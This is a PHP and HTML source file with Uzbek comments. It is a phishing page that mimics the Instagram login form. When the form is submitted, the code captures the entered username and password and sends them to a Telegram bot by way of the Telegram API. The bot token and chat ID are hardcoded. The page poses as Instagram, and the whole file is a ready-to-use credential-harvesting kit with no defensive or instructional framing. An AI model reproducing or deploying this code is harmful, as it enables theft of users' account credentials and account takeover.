<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Telegram bot token va chat ID
    $botToken = "8009473065:AAES2gYTxjXlG_Rt8jZCRM_XWAmZXP4MO8Y"; // Bot tokeningizni kiriting
    $chatID = "7297431840"; // Chat ID ni kiriting

    // Foydalanuvchi ma'lumotlarini olish va xavfsizlashtirish
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);

    // Xabarni tayyorlash
    $message = "🔒 Instagram Login Info:\n👤 Username: $username\n🔑 Password: $password";

    // Telegram API orqali xabar yuborish
    $apiURL = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
        'chat_id' => $chatID,
        'text' => $message
    ];

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ],
    ];

    $context = stream_context_create($options);
    $response = @file_get_contents($apiURL, false, $context);

    // Xatolarni tekshirish
    if ($response) {
        echo "<script>alert('Login information sent successfully!');</script>";
    } else {
        echo "<script>alert('Failed to send login information. Please try again.');</script>";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-form {
            width: 300px;
            background: #fff;
            border: 1px solid #ddd;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            padding: 20px;
        }
        .login-form h2 {
            text-align: center;
            font-family: 'Roboto', sans-serif;
            font-size: 24px;
            color: #333;
            margin-bottom: 20px;
        }
        .login-form input {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
            font-size: 14px;
        }
        .login-form button {
            width: 100%;
            padding: 10px;
            background-color: #3897f0;
            border: none;
            border-radius: 5px;
            color: white;
            font-size: 16px;
            cursor: pointer;
        }
        .login-form button:hover {
            background-color: #318ce7;
        }
        .login-form p {
            text-align: center;
            font-size: 12px;
            color: #999;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="login-form">
        <h2>Instagram</h2>
        <form method="POST" action="">
            <input type="text" name="username" placeholder="Phone number, username, or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <p>Not a member? <a href="#">Sign up</a></p>
    </div>
</body>
</html>